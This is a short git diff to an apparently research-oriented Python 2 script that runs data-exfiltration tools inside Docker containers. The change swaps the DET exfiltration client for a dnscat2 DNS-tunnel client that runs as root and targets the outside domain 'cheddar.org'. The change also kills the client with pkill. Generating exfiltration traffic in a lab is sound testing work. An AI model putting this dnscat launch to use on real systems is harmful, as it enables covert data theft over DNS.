@@ -1068,6 +1068,12 @@ def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_ex
     return file_to_exfil
 
 def start_det_client(file, protocol, container):
+    cmds = ['/dnscat2/client/dnscat', 'cheddar.org']    
+    print "start dns exfil commands", str(cmds)
+    out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
+    print "dnscat client output output"
+
+    ''' # todo: re-enable if you wanna use DET again
     cmds = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-f", file]
     print "start det client commands", str(cmds)
     print "start det client commands", str(cmds)[1:-1]
@@ -1081,10 +1087,12 @@ def start_det_client(file, protocol, container):
     out = container.exec_run(loopy_cmds, user="root", workdir='/DET', stdout=False)
     #out = container.exec_run(cmds, user="root", workdir='/DET', stdout=False)
     print "start det client output", out
+    '''
 
 def stop_det_client(container):
     ## let's just kill all python processes, that'll be easier than trying to record PIDs, or anything else
-    cmds = ["pkill", "-9", "python"]
+    #cmds = ["pkill", "-9", "python"] ## TODO: re-enable when going back to DET
+    cmds = ["pkill", "dnscat"]
     out =container.exec_run(cmds, user="root", stream=True)
     print "stop det client output: "#, out
     #print "response from command string:"
